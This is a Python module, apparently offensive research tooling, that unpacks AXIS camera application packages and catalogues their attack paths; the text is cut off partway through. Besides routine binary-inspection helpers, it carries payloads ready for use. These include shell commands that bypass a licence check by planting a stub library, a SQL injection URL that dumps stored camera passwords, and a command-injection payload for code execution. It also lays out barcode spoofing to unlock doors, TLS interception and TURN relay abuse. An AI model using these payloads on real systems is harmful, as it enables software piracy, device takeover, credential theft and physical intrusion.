"""
axis_eap_re — AXIS ACAP EAP package RE module

Reverse engineers AXIS camera application packages (*.eap = gzip'd tar).

Targets (by binary, arch, key surface):
  SipThirdPartyIntegration   aarch64 ELF unstripped; liblicensekey.so bypass chain
  BarcodeReader              ARM32 ELF stripped; ignoreCert=1 default; nbix PACS/door control
  BodyWornLiveSelfHosted     aarch64 Go static; WebRTC/coturn/MQTT/JWT; TURN credential leak
  facedetector               aarch64 ELF stripped; protobuf CGI decode; VideoObjectDetection D-Bus
  fflprapp                   aarch64 ELF stripped; SQLi in search CGI; shell inject via popen curl
  tvpc                       aarch64 ELF stripped; restore_backup tarslip; TCP 23456 unauth inject
  axptzoversnmp              MIPS32; NTCIP 1205 CCTV MIB; full PTZ control via SNMP SET
  metricdashboard            aarch64 ELF stripped; Modbus TCP SSRF; NMEA GPS spoof; RS-485
  metadata_provider          ARM32; mosquitto allow_anonymous; MQTT bridge SSRF + /etc/hosts inject
  a3dpc                      MIPS32; pyrun Python 4.5MB; admin CGI pkg install; X-Forwarded-User
  sbplayer                   aarch64 ELF unstripped; UpdateURL axparam → library SSRF (checksum server-supplied)
  remote_ptz_conn_setup      aarch64 ELF unstripped; setvapixparams.cgi writes VAPIX params to remote camera

  DoorControllerExtension ARM32; stub; build path leak /home/svcj/workspace/...
  radar_microbus         ARM32; protobuf radar events; libfdipc.so.1; dlopen libradar_scene_subscriber.so.0
  tvgd                   ARM32; Demographic Identifier; PII age/gender JSON; tarslip restore; curl -k restart
  vmd                    ARM32; Video Motion Detection 4; ONVIF CGI handler; libscene.so/libgeometry.so
  InformaCastAcap        ARM32; Speaker/Singlewire sentinel; informacast-client service gate (exit 77)

Standalone:
    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --all
    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --lpv
    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --people-counter
    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --ptz-snmp
    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --sensor-metrics
    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --metadata-provider
    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --3dpc
    python3 modules/axis_eap_re.py /path/to/SipThirdPartyIntegration --license-bypass
    python3 modules/axis_eap_re.py /tmp --radar
    python3 modules/axis_eap_re.py /tmp --di
    python3 modules/axis_eap_re.py /tmp --vmd
    python3 modules/axis_eap_re.py /tmp --informacast
    python3 modules/axis_eap_re.py /tmp --dce
"""

import argparse
import json
import os
import re
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path


# ── helpers ──────────────────────────────────────────────────────────────────

def _run(cmd: list[str], **kw) -> subprocess.CompletedProcess:
    kw.setdefault('capture_output', True)
    kw.setdefault('text', True)
    return subprocess.run(cmd, **kw)


def _strings(path: str, min_len: int = 4) -> list[str]:
    r = _run(['strings', f'-{min_len}', path])
    return r.stdout.splitlines() if r.returncode == 0 else []


def _nm(path: str) -> tuple[list[str], list[str]]:
    """Returns (defined_syms, undefined_imports)."""
    r = _run(['nm', path])
    defined, undefined = [], []
    for line in r.stdout.splitlines():
        parts = line.split()
        if ' U ' in line:
            undefined.append(parts[-1])
        elif len(parts) >= 3:
            defined.append(parts[-1])
    return defined, undefined


def _readelf_dynamic(path: str) -> list[str]:
    r = _run(['readelf', '-d', path])
    libs = []
    for line in r.stdout.splitlines():
        m = re.search(r'NEEDED.*\[(.+?)\]', line)
        if m:
            libs.append(m.group(1))
    return libs


def _file(path: str) -> str:
    r = _run(['file', path])
    return r.stdout.strip()


def _extract_eap(eap_path: str, dest: str) -> bool:
    try:
        with tarfile.open(eap_path, 'r:gz') as tf:
            tf.extractall(dest)
        return True
    except tarfile.TarError:
        # Trailing garbage (EAP signature); try streaming
        try:
            r = _run(['tar', 'xzf', eap_path, '-C', dest])
            return True
        except Exception:
            return False


# ── core class ───────────────────────────────────────────────────────────────

class AxisEAPAnalyzer:
    """
    RE engine for AXIS ACAP EAP packages.

    Pass either:
      - A directory containing *.eap files (survey mode)
      - A path to a single extracted ELF binary (targeted mode)
    """

    # Known EAP slugs and their primary binary name
    KNOWN_PACKAGES = {
        'SipThirdPartyIntegration': 'sip_ucs',
        'BarcodeReader': 'BarcodeReader',
        'BodyWornLiveSelfHosted': 'BodyWornLiveSelfHosted',
        'facedetector': 'facedetector',
        'fflprapp': 'fflprapp',              # AXIS License Plate Verifier
        'tvpc': 'tvpc',                      # AXIS People Counter
        'axptzoversnmp': 'axptzoversnmp',    # PTZ over SNMP
        'metricdashboard': 'metricdashboard', # AXIS Sensor Metrics Dashboard
        'metadata_provider': 'metadata_provider',  # Metadata Provider
        'a3dpc': 'a3dpc',                    # AXIS 3D People Counter
        'sbplayer': 'sbplayer',              # Player for Soundtrack Business
        'remote_ptz_conn_setup': 'remote_ptz_conn_setup',  # p-ptz remote connection
    }

    # licensekey_verify bypass env vars (from disasm of licensekey_stat.c)
    # Verified in SipThirdPartyIntegration @ 0x26b0–0x2770:
    #   getenv("licensekey_path") → handle_pathlist → file_overrides_symbols (dlopen/dlsym)
    #   getenv("LD_LIBRARY_PATH") → handle_pathlist → dir_contains_overriding_lib
    #   test_ld_so_preload()      → open("/etc/ld.so.preload"), mmap, parse, handle_pathlist
    LICENSE_BYPASS_ENV = [
        ('licensekey_path', 'colon-separated path list; if dir contains liblicensekey.so with matching symbols, verify returns 0'),
        ('LD_LIBRARY_PATH', 'standard LD path; dir_contains_overriding_lib scans for liblicensekey.so match'),
    ]

    # /etc/ld.so.preload bypass (test_ld_so_preload @ 0x24d0):
    # Opens /etc/ld.so.preload O_RDONLY, mmaps it, strips '#' comment lines,
    # passes each path token to handle_pathlist → dir_contains_overriding_lib.
    # Requires write access to /etc/ld.so.preload on device.
    LD_SO_PRELOAD_PATH = '/etc/ld.so.preload'

    # Enabled sentinel file (create_enabled_file / remove_enabled_file):
    ENABLED_FILE = '/etc/dynamic/sipd/acaps/third-party-integration-enabled'

    # ACAP app ID for SIP UCS (from manifest.json + licensekey_verify call @ 0x1ddc):
    # licensekey_verify(app_name, 0x654d2, minor=1, flags=0)
    # 0x654d2 = 414930 decimal = appId in manifest
    SIP_APP_ID = 414930

    def __init__(self, target: str):
        self.target = Path(target)
        self.tmpdir = None
        self.packages: dict[str, Path] = {}  # slug -> extracted dir
        self._scan_target()

    def _scan_target(self):
        if self.target.is_dir():
            # Check if it's a pre-extracted package dir
            for name in self.KNOWN_PACKAGES:
                binary = self.target / name
                if binary.exists():
                    self.packages[name] = self.target
                    return
            # Otherwise scan for *.eap files
            seen: set[str] = set()
            for eap in sorted(self.target.glob('*.eap')):
                # Deduplicate: keep one per base name (strip " (N)" suffix)
                base = re.sub(r'\s*\(\d+\)$', '', eap.stem)
                if base in seen:
                    continue
                seen.add(base)
                self._extract_package(eap)
        elif self.target.is_file():
            # Single binary — determine type from filename
            for name in self.KNOWN_PACKAGES:
                if name.lower() in self.target.name.lower():
                    self.packages[name] = self.target.parent
                    return
            # Unknown binary — add as raw
            self.packages[self.target.name] = self.target.parent

    def _extract_package(self, eap_path: Path) -> Path | None:
        if self.tmpdir is None:
            self.tmpdir = Path(tempfile.mkdtemp(prefix='axis_eap_'))
        dest = self.tmpdir / eap_path.stem.replace(' ', '_')
        dest.mkdir(exist_ok=True)
        ok = _extract_eap(str(eap_path), str(dest))
        if not ok:
            return None
        for name in self.KNOWN_PACKAGES:
            binary = dest / name
            if binary.exists():
                self.packages[name] = dest
                return dest
        # Unknown package — add by stem
        self.packages[eap_path.stem] = dest
        return dest

    # ── public API ────────────────────────────────────────────────────────────

    def survey(self) -> dict:
        """Quick survey of all extracted packages."""
        results = {}
        for slug, pkg_dir in self.packages.items():
            binary = pkg_dir / slug if (pkg_dir / slug).exists() else None
            if binary is None:
                # Find the first executable
                for f in pkg_dir.iterdir():
                    if f.is_file() and os.access(f, os.X_OK):
                        binary = f
                        break
            if binary is None:
                results[slug] = {'error': 'no binary found', 'dir': str(pkg_dir)}
                continue
            info = {
                'binary': str(binary),
                'file': _file(str(binary)),
                'size': binary.stat().st_size,
                'libs': _readelf_dynamic(str(binary)),
                'manifest': self._read_manifest(pkg_dir),
            }
            results[slug] = info
        return results

    def licensekey_bypass_vectors(self, binary_path: str | None = None) -> dict:
        """
        Map licensekey_verify() bypass paths for SipThirdPartyIntegration.

        Three bypass paths (from licensekey_stat.c via DWARF + disasm):
          1. licensekey_path env var → handle_pathlist → file_overrides_symbols
             (dlopen the colon-list; if dlsym finds licensekey_dyn_verify in it → returns 0)
          2. LD_LIBRARY_PATH → dir_contains_overriding_lib (scans each dir for liblicensekey.so)
          3. /etc/ld.so.preload → same dir scan (requires write to /etc/ld.so.preload)

        All three converge at dir_contains_overriding_lib.part.0 @ 0x2300:
          opendir(dir), snprintf path = dir + "/" + "liblicensekey.so",
          access(path, F_OK) → if exists, returns 1 → licensekey_verify returns 0 (VALID).

        Frida hook target on device:
          licensekey_verify @ liblicensekey.so.1 (NOT the wrapper in this binary)
          Patch: replace retval register (w0) with 0 after bl licensekey_dyn_verify@plt
        """
        if binary_path is None:
            pkg_dir = self.packages.get('SipThirdPartyIntegration')
            if pkg_dir:
                binary_path = str(pkg_dir / 'SipThirdPartyIntegration')

        result = {
            'binary': binary_path,
            'app_id': self.SIP_APP_ID,
            'enabled_sentinel': self.ENABLED_FILE,
            'sipd_required': '/usr/bin/sipd',
            'bypass_paths': [],
            'frida_hook': None,
        }

        # Path 1: licensekey_path env var
        result['bypass_paths'].append({
            'method': 'licensekey_path env var',
            'mechanism': (
                'Set licensekey_path=/writable/dir before exec. '
                'file_overrides_symbols() dlopen()s each colon-separated path as a dir; '
                'if dlsym(handle, "licensekey_dyn_verify") succeeds, returns 1 → verify returns 0.'
            ),
            'prerequisite': 'Can inject env vars into the ACAP process (e.g., via /etc/acap.conf or ACAP start hook)',
            'payload': 'mkdir /tmp/lk; cp <stub.so> /tmp/lk/liblicensekey.so; export licensekey_path=/tmp/lk',
        })

        # Path 2: LD_LIBRARY_PATH
        result['bypass_paths'].append({
            'method': 'LD_LIBRARY_PATH',
            'mechanism': (
                'dir_contains_overriding_lib() walks each LD_LIBRARY_PATH dir; '
                'checks access("dir/liblicensekey.so", F_OK). '
                'If found, licensekey_verify() short-circuits and returns 0 (VALID). '
                'The stub does NOT need to implement any symbols — access() check only.'
            ),
            'prerequisite': 'Can set LD_LIBRARY_PATH in the process environment',
            'payload': 'mkdir /tmp/lk; touch /tmp/lk/liblicensekey.so; export LD_LIBRARY_PATH=/tmp/lk',
        })

        # Path 3: /etc/ld.so.preload
        result['bypass_paths'].append({
            'method': '/etc/ld.so.preload write',
            'mechanism': (
                'test_ld_so_preload() opens /etc/ld.so.preload O_RDONLY, mmaps it, '
                'strips lines starting with 0x23 (#), splits on whitespace, '
                'calls handle_pathlist → dir_contains_overriding_lib per token. '
                'Same F_OK check as LD_LIBRARY_PATH path.'
            ),
            'prerequisite': 'Write access to /etc/ld.so.preload on device (root / ACAP install context)',
            'payload': 'echo /tmp/lk > /etc/ld.so.preload; mkdir /tmp/lk; touch /tmp/lk/liblicensekey.so',
        })

        # Frida hook
        result['frida_hook'] = self._sip_frida_hook()

        # Static verification from binary
        if binary_path and Path(binary_path).exists():
            result['static_checks'] = self._verify_license_disasm(binary_path)

        return result

    def bodyworn_attack_surface(self) -> dict:
        """
        BodyWornLiveSelfHosted Go binary attack surface.

        Components: rsignal (WebRTC signaling), coturn (TURN relay), mosquitto (MQTT),
                    vapixbridge (VAPIX↔MQTT), JWT auth (golang-jwt/jwt v5),
                    policykitcert (D-Bus cert management), IDD daemon.

        High-value CGI endpoints (from embedded Go symbol table):
          - auth.getSignalingClientToken  → issues JWT for WebRTC clients
          - auth.getStunTurnTestCredentials → returns TURN username+credential
          - setup.testSystemCredentials   → tests VAPIX digest auth (creds in request)
          - rsignal.getICEConfig          → ICE server list (STUN/TURN URLs + auth)
          - cgi.SetBasicAuth              → VAPIX Basic Auth wrapper
        """
        pkg_dir = self.packages.get('BodyWornLiveSelfHosted')
        binary = str(pkg_dir / 'BodyWornLiveSelfHosted') if pkg_dir else None

        result = {
            'binary': binary,
            'type': 'Go static aarch64',
            'go_build_id': None,
            'components': {
                'rsignal': 'WebRTC signaling server; JWT-gated ICE config endpoint',
                'coturn': 'TURN relay; cert-aware; restarts on cert/param change',
                'mosquitto': 'MQTT broker; vapixbridge translates Axis events to MQTT',
                'vapixbridge': 'MQTT↔VAPIX bridge; handles positioning + state events',
                'policykitcert': 'D-Bus client for cert set management (CreateCertificateSet)',
                'idd': 'rsignal/ IDD daemon directory present',
            },
            'cgi_attack_surface': [
                {
                    'endpoint': 'auth.getStunTurnTestCredentials',
                    'risk': 'Returns live TURN username+credential; no auth validated in test path',
                    'method': 'GET',
                    'notes': 'Issued via Authorizer.NewCoturnCredentials; coturn HMAC-SHA1 TURN credential',
                },
                {
                    'endpoint': 'auth.getSignalingClientToken',
                    'risk': 'Issues short-lived JWT signed with device key; WebRTC client access',
                    'method': 'GET',
                    'notes': 'golang-jwt/jwt v5; ECDSA or HMAC depending on key type in policykitcert',
                },
                {
                    'endpoint': 'setup.testSystemCredentials',
                    'risk': 'Validates VAPIX digest credentials supplied in CGI params; credential oracle',
                    'method': 'POST',
                    'notes': 'vapix.GetCredentials → VAPIX loopback auth; wrong creds = 401 timing diff',
                },
                {
                    'endpoint': 'rsignal.getICEConfig',
                    'risk': 'Returns STUN/TURN server list with auth tokens; may expose internal relay',
                    'method': 'GET',
                    'notes': 'rsignal.API.getICEConfig; auth via ValidateSignalingServerCredential',
                },
            ],
            'jwt_notes': (
                'golang-jwt/jwt v5 with WithValidMethods enforced. '
                'SigningMethodNone (alg:none) is registered but should be blocked by WithValidMethods. '
                'Verify ValidateSignalingServerCredential.WithValidMethods.func2 enforces non-none algs. '
                'JWT kid header not observed in symbols — key rotation surface unclear.'
            ),
            'coturn_credential_algo': (
                'Standard TURN REST API: username=<timestamp>:<user>, '
                'credential=HMAC-SHA1(shared_secret, username). '
                'getStunTurnTestCredentials exposes this without requiring camera auth in test context.'
            ),
            'files': {},
            # 2.0.x binary RE additions
            'v2_re': {
                'coturn_version': '4.7.0 (Gorst) — OpenSSL 3.0/3.2',
                'rsignal_language': 'Rust (cargo/ureq-2.12.1 HTTP client paths embedded)',
                'rsignal_proxy': 'ALL_PROXY/HTTPS_PROXY/HTTP_PROXY env vars honored — proxy injection via environment',
                'mosquitto_size_unchanged': 'mosquitto binary identical between 2.0.0 and 2.0.1',
                'main_binary_diff': '2.0.0=12976312 bytes, 2.0.1=13107362 bytes (+131050); coturn +4096',
                'credential_logging': '"Username:%s Password:%s" format string in Go binary',
                'pre_uninstall': 'gdbus call com.axis.PolicyKitCert.CertSetDeleteUnpriv — upgrade deletes certs, breaking TLS until re-provisioned',
                'idd_plugins': [
                    'bwlcore', 'bws_webrtc_coturn_metrics', 'common.sh',
                    'context', 'device_configurations', 'fan_status', 'load_avg',
                    'meminfo', 'network_stats', 'page_info', 'storage_properties',
                    'syslog', 'syslog_critical', 'syslog_error', 'syslog_info',
                    'syslog_warning', 'vmstatus_v2',
                ],
                'vapix_go_packages': [
                    'github.com/axteams-one/bws-webrtc-acap/internal/vapix',
                    'github.com/axteams-one/bws-webrtc-acap/internal/coturn',
                    'com.axis.bodyworn/positioning@v1.0.0',
                ],
                'vapix_cert_ops': [
                    'vapix.GetCertificatesRequest / GetCertificatesResponse',
                    'vapix.DeleteCertificatesResponse',
                    'CACertificateIDs, CertificateIDs, Certificate, CertSet, CertSetName',
                ],
                'turn_relay_abuse': 'coturn 4.7.0 exposes TURN relay; attacker with TURN credential can relay traffic through camera to internal network',
            },
        }

        if pkg_dir:
            for fname in ['coturn', 'mosquitto', 'rsignal', 'idd']:
                subdir = pkg_dir / fname
                if subdir.is_dir():
                    result['files'][fname] = [f.name for f in subdir.iterdir()]

            # Extract Go build ID
            if binary and Path(binary).exists():
                strs = _strings(binary, min_len=6)
                for s in strs:
                    if 'BuildID' in s or s.startswith('S9R') or s.startswith('Go build'):
                        result['go_build_id'] = s
                        break

        return result

    def barcode_vapix_surface(self) -> dict:
        """
        AXIS Barcode Reader (BarcodeReader) attack surface — appId 413766.

        Available as ARM32 (armhf, v1.3.2, SHA e1a4ee) and aarch64 (v1.3.2, SHA ba161d).
        Both binaries carry identical functionality; arch is the only difference.

        Key findings:

        1. NBIX agent / PACS door control (physical access security chain)
           The barcode reader sends scanned barcodes to the NBIX agent for door controller
           integration. JSON D-Bus calls confirmed in binary:
             {"axtdc:GetDoorList":{}} — enumerate all doors on the camera
             {"axtid:GetIdPointList":{}} — enumerate all ID points
             {"axtid:GetIdPointConfigurationList":{}} — get ID point config
             {"axtid:IndicateRemoteActivities":{"Token":"%s","Description":"%s",...}}
           A barcode value that matches an allowed token triggers door unlock via
           axtid:IndicateRemoteActivities. No server-side token validation visible in binary —
           the camera trusts the barcode scanner's reported value.
           Attack: craft a barcode value that matches a valid token pattern to grant physical access.

        2. ignoreCert=1 default in param.conf
           Default param: ignoreCert="1" (type hidden:int:min=0;max=1)
           When enabled, TLS certificate validation is suppressed on all libcurl calls.
           Combined with the VAPIX service account (see #3), this enables MITM of all
           cloud/NBIX/PACS HTTP traffic from the barcode reader.

        3. VAPIX service account token via D-Bus
           Accesses com.axis.HTTPConf1.VAPIXServiceAccounts1 via D-Bus to obtain a
           VAPIX service account token. Token used to authenticate HTTP calls to
           http://127.0.0.12/%s (loopback VAPIX). If the camera's D-Bus session is
           accessible to other ACAP packages, token can be sniffed.

        4. OpenCV 3.4.7 embedded (ARM32 binary)
           Build string in binary confirms GCC 13.3.0 with -fstack-protector-strong and
           _FORTIFY_SOURCE=2. OpenCV 3.4.7 alignment gap note present (CVE surface).

        5. PacsConfig / PacsConfigv1 JSON axparameter
           Both are stored as JSON strings in axparameter. Content not validated in binary.
           If PacsConfig is writable (operator-level), injecting malformed JSON into PACS
           config may affect door control behavior.

        CGI: /pacsconfig (viewer-level — admin read-only in cgi.conf)
        """
        pkg_dir = self.packages.get('BarcodeReader')
        binary = str(pkg_dir / 'BarcodeReader') if pkg_dir else None

        result = {
            'binary': binary,
            'app_id': 413766,
            'arch_variants': {
                'armhf': 'ARM32 EABI5 armv7hf, SHA e1a4ee, v1.3.2, stripped',
                'aarch64': 'ARM64 aarch64, SHA ba161d, v1.3.2, stripped',
            },
            'cgi': '/pacsconfig (viewer level — cgi.conf: "viewer /pacsconfig")',
            'libs': [
                'libstatuscache.so.1', 'libaxevent.so.1', 'libaxparameter.so.1',
                'libaxhttp.so.1', 'libcurl.so.4', 'libjansson.so.4',
                'libvdostream.so.1', 'liblicensekey.so.1',
            ],
            'params': {
                'ignoreCert': '1 (DEFAULT) — TLS cert validation disabled for all libcurl calls',
                'BarcodeType': '2 (default)',
                'PacsConfig': '{} (JSON string — writable at operator level)',
                'PacsConfigv1': '{} (JSON string — writable)',
                'useAgent': '0 — NBIX agent mode',
                'BarcodeFormats': 'QRCode (default)',
                'HttpsEnforced': '1',
            },
            'nbix_pacs': {
                'dbus_calls': [
                    '{"axtdc:GetDoorList":{}}',
                    '{"axtid:GetIdPointList":{}}',
                    '{"axtid:GetIdPointConfigurationList":{}}',
                    '{"axtid:IndicateRemoteActivities":{"Token":"%s","Description":"%s","Activities":[...]}}',
                ],
                'note': 'Barcode value maps to Token in IndicateRemoteActivities — no visible crypto validation in binary',
            },
            'whitelist_codes': '18 barcode format codes (AIM symbology IDs: 706/71D/770/779/7E6/976/7DF/9C1/95A.x/9CA.x/980/A25.x/A66.2)',
            'attack_paths': [
                {
                    'id': 'BR-1',
                    'title': 'Physical access bypass via barcode token spoofing',
                    'mechanism': (
                        'Craft a barcode value matching a valid NBIX token. '
                        'Scanner calls IndicateRemoteActivities with attacker-controlled Token string. '
                        'No server-side crypto validation visible in binary — trust is based on barcode value only.'
                    ),
                    'severity': 'CRITICAL',
                    'prerequisite': 'Physical access to barcode scanner camera field of view',
                },
                {
                    'id': 'BR-2',
                    'title': 'MITM via ignoreCert=1 default',
                    'mechanism': (
                        'Default param ignoreCert="1" disables TLS verification on all libcurl calls. '
                        'Position attacker between barcode reader and PACS/NBIX backend to intercept '
                        'and modify access control decisions.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Network position between camera and PACS server',
                },
                {
                    'id': 'BR-3',
                    'title': 'PacsConfig JSON injection',
                    'mechanism': 'PacsConfig axparameter is a raw JSON string; operator-level write → malformed JSON in PACS config',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Operator-level camera auth',
                },
                {
                    'id': 'BR-4',
                    'title': 'VAPIX service account token leak',
                    'mechanism': 'Token obtained from com.axis.HTTPConf1.VAPIXServiceAccounts1 D-Bus; used for loopback VAPIX calls; sniffable by co-resident ACAP',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Another ACAP installed on the same camera',
                },
            ],
            'license_gate': 'liblicensekey.so.1 — same bypass vectors as SipThirdPartyIntegration',
            'files': {},
        }

        if pkg_dir:
            for fname in ['cgi.conf', 'param.conf', 'whitelist.txt', 'manifest.json']:
                f = pkg_dir / fname
                if f.exists():
                    result['files'][fname] = f.read_text(errors='replace').strip()

        return result

    def lpv_surface(self, pkg_dir: str | None = None) -> dict:
        """
        AXIS License Plate Verifier (fflprapp) aarch64 ELF attack surface.

        Key findings from binary RE (appId 333330, ARTPEC-8 build, v3.0.13):

        1. SQLite plaintext credentials
           CREATE TABLE CAMERA_BWLIST(CAMERA_NAME,CAMERA_IP,CAMERA_LOGIN,CAMERA_PASSWORD...)
           CREATE TABLE CAMERA_MASTER_BWLIST(...same schema...)
           Stored in /usr/local/packages/fflprapp/localdata/cfg/*.db
           Readable by any process with ACAP package read access.

        2. SQL injection in search CGI (search.cgi / search_v.cgi / search_o.cgi)
           Query strings: "AND LPR_UTF8 LIKE '%%%s%%'" / "AND COUNTRY LIKE '%%%s%%'"
           / "AND LP_DESCRIPTION LIKE '%%%s%%'"
           The %s is directly from CGI params — no parameterized query. Classic LIKE injection.
           Access level: viewer (search_v.cgi), operator (search_o.cgi), admin (search.cgi).
           LPR_EVENTS table contains: plate text, bitmaps (LP_BMP, ROI_BMP), coords, speed,
           direction, car maker/model/color, ISO3166 code — PII-dense.

        3. Shell injection via curl format strings (cloud integration)
           Binary calls system()/popen() with:
             "cp localdata/create_overlay.json /tmp;curl %s -o %s --anyauth -u '%s:%s' ..."
             "curl %s --anyauth -u '%s:%s' '%s://%s/axis-cgi/io/port.cgi?action=%d%%3A%s'"
           The %s parameters are from ax_parameter_get() (cloud_config/user, cloud_config/password,
           a91xx_config/ipc_login, a91xx_config/ipc_password, etc.).
           If an attacker can write to axparameter store (via config_o.cgi / api_o.cgi at operator
           level), injecting shell metacharacters into these fields achieves RCE via popen().

        4. Cloud integration credential exposure (3 cloud endpoints)
           cloud_config/{user,password,http_auth_type,proxy_user,proxy_password,cloud_url}
           hb_config/{user,password,http_auth_type}
           a91xx_config/{ipc_login,ipc_password,a91xx_url,latitude,longitude}
           gsc_config/{user,password}
           All stored in axparameter persistent store; readable via test.cgi (operator).

        5. upload.cgi — arbitrary .rcf / .db file write
           Accepts multipart POST at operator level.
           RCF (recognition config files) are loaded directly into ANPR engine.
           Malformed RCF or path-traversal in filename field may reach filesystem write.

        6. list_mgmt.cgi — allow/block/custom list mutation
           Operator-level CGI controls vehicle access lists.
           EventAllowList / EventBlockList / EventCustomList events flow to 2N/GSC/A91xx
           integrations — list poisoning can suppress or spoof gate access events.

        7. Heartbeat exposure (fflprapp_hb.json)
           Reports: platform, version, IP, MAC, osVersion, anprVersion, device_ID,
           numFrames, numberOfReads — device fingerprint sent to external HB endpoint.

        8. ANPR model surface (TFLite, 11 files)
           onnx_model_full_integer_quant.tflite (6.8M) — primary OCR model
           Multi_detector_step1/2.tflite (3M each) — plate detection
           LP_type_{aus,eu,gcc,sa,usa}.tflite — region classifiers
           color_resnet_relu.tflite — vehicle color classification
           Symbol.tflite — character recognizer
           Models loaded via liblarod.so.1 (Axis ARTPEC ML accelerator).
           No signature verification on model files — malicious .tflite substitution = model swap.

        9. GitLab reference in binary
           "http://gitlab.f-f.kyiv.ua/wikis/home" — Ukrainian GitLab instance embedded in
           libexpat-derived XML error string; indicates third-party ANPR SDK origin (f-f = Flash
           Forward, Kyiv-based ANPR vendor).

        CGI access level map:
          viewer:    events_v, tools_v, config_v, search_v, config_json_v, api_v, live.yuv
          operator:  test, events_o, config_o, search_o, api_o, black/white/block/allow/custom_list,
                     list_mgmt, count, upload, offline.yuv, config_json_o, config_json, tools_o
          admin:     search, settings, config, config_nok*, config_axisa1001*, test_axisa1001,
                     config_a1601, config_a91xx, config_2n, config_gsc, config_hb, config_hb_data,
                     test_connect, cloud, cloud2, cloud3, events, tools, tools2, api, backup/restorecfg,
                     vapix_events
        """
        if pkg_dir is None:
            pd = self.packages.get('fflprapp')
            if pd is not None:
                pkg_dir = str(pd)

        binary = str(Path(pkg_dir) / 'fflprapp') if pkg_dir else None

        result = {
            'binary': binary,
            'app_id': 333330,
            'app_name': 'AXIS License Plate Verifier',
            'binary_name': 'fflprapp',
            'arch': 'aarch64 ELF stripped',
            'version': '3.0.13',
            'sdk_origin': 'Flash Forward (f-f.kyiv.ua) ANPR SDK — ref in binary strings',
            'libs': [
                'libglib-2.0.so.0', 'libgobject-2.0.so.0', 'libgio-2.0.so.0',
                'libturbojpeg.so.0', 'libaxparameter.so.1', 'libaxhttp.so.1',
                'libaxevent.so.1', 'libcurl.so.4', 'libsqlite3.so.0',
                'liblicensekey.so.1', 'libvdostream.so.1', 'liblarod.so.1',
                'libaxstorage.so.1',
            ],
            'tflite_models': [
                'onnx_model_full_integer_quant.tflite (6.8M) — primary OCR',
                'Multi_detector_step1.tflite (3M), Multi_detector_step2.tflite (3M) — plate detection',
                'LP_type_{aus,eu,gcc,sa,usa}.tflite (1.5M each) — region classifiers',
                'color_resnet_relu.tflite (1.4M) — vehicle color',
                'Symbol.tflite (3.1M) — character recognizer',
            ],
            'sqlite_schema': {
                'LPR_EVENTS': (
                    'TS,MOD_TS,END_TS,CAR_ID,LPR,LPR_UTF8,LPR_UNICODE,RTIME,ACTION,'
                    'ACT_PARAM,THRESHOLD,ROI_X,ROI_Y,ROI_W,ROI_H,LP_X,LP_Y,LP_W,LP_H,'
                    'ROI_ID,ROI_IDU,FRAMES,DISTANCE,SPEED,DIRECTION,LP_BMP,ROI_BMP,'
                    'COUNTRY,LP_LIST_MODE,LP_DESCRIPTION,LP_REGION_UTF8,ISO3166_2_CODE,'
                    'LP_TYPE,EXT1,EXT2,EXT3,CAR_MAKER,CAR_MODEL,CAR_M_TYPE,CAR_COLOR,'
                    'CAR_CONF,CAR_VIEW,CAR_COLOR_CONF'
                ),
                'CAMERA_BWLIST': 'CAMERA_NAME,CAMERA_IP,CAMERA_LOGIN,CAMERA_PASSWORD,CAMERA_SYNC — plaintext creds',
                'CAMERA_MASTER_BWLIST': 'same schema as CAMERA_BWLIST — master sync source',
                'LPR_UAE': 'CAR_ID,GCC_PLATE_SERIES,GCC_COLOR,GCC_PLATE_TYPE',
                'LPR_MMR_%d_CLASSES': 'BRAND,MODEL,TYPE — make/model/type lookup',
                'LPR_VERSION': 'TS,MOD_TS,LPR_APP_VERSION,LPR_DB_VERSION,STATUS',
            },
            'attack_paths': [
                {
                    'id': 'LPV-1',
                    'title': 'SQL injection in plate/country/description search params',
                    'cgi': 'search_v.cgi (viewer), search_o.cgi (operator), search.cgi (admin)',
                    'query': "AND LPR_UTF8 LIKE '%%%s%%' / AND COUNTRY LIKE '%%%s%%' / AND LP_DESCRIPTION LIKE '%%%s%%'",
                    'impact': 'Read full LPR_EVENTS table: plates, bitmaps, GPS coords, speed, vehicle PII',
                    'severity': 'HIGH',
                    'exploit': "search_v.cgi?plate='+UNION+SELECT+CAMERA_PASSWORD,2,3,...+FROM+CAMERA_BWLIST--",
                },
                {
                    'id': 'LPV-2',
                    'title': 'Shell injection via cloud/integration credential fields',
                    'cgi': 'config_o.cgi / api_o.cgi (operator-level write to axparameter)',
                    'mechanism': (
                        'cloud_config/user, cloud_config/password, a91xx_config/ipc_password, '
                        'gsc_config/password interpolated into popen() curl command strings. '
                        'Payload: user=x;cmd>/tmp/out;# → executes cmd on camera.'
                    ),
                    'impact': 'RCE as ACAP process user (acap-fflprapp); pivot to camera root via SUID',
                    'severity': 'CRITICAL',
                    'prerequisite': 'Operator-level auth to camera web interface',
                },
                {
                    'id': 'LPV-3',
                    'title': 'Plaintext camera credentials in SQLite DB',
                    'path': '/usr/local/packages/fflprapp/localdata/cfg/*.db',
                    'schema': 'CAMERA_BWLIST(CAMERA_IP, CAMERA_LOGIN, CAMERA_PASSWORD)',
                    'impact': 'Lateral movement: credentials for synchronized cameras stored cleartext',
                    'severity': 'HIGH',
                    'access': 'Any process with read access to /usr/local/packages/fflprapp/',
                },
                {
                    'id': 'LPV-4',
                    'title': 'TFLite model substitution (no integrity check)',
                    'path': '/usr/local/packages/fflprapp/models/*.tflite',
                    'mechanism': 'liblarod.so.1 loads models by path; no hash/signature verification in strings',
                    'impact': 'Swap onnx_model_full_integer_quant.tflite → adversarial model; suppress/spoof plate reads',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Write access to package models dir (ACAP reinstall or filesystem access)',
                },
                {
                    'id': 'LPV-5',
                    'title': 'Access list poisoning via list_mgmt.cgi',
                    'cgi': 'list_mgmt.cgi, allow_list.cgi, block_list.cgi, custom_list.cgi (operator)',
                    'impact': 'Suppress EventBlockList or inject EventAllowList entries; physical access bypass at gates',
                    'severity': 'HIGH',
                    'integrations': '2N intercom, GSC3574, A91xx IPC, HB (heartbeat cloud)',
                },
                {
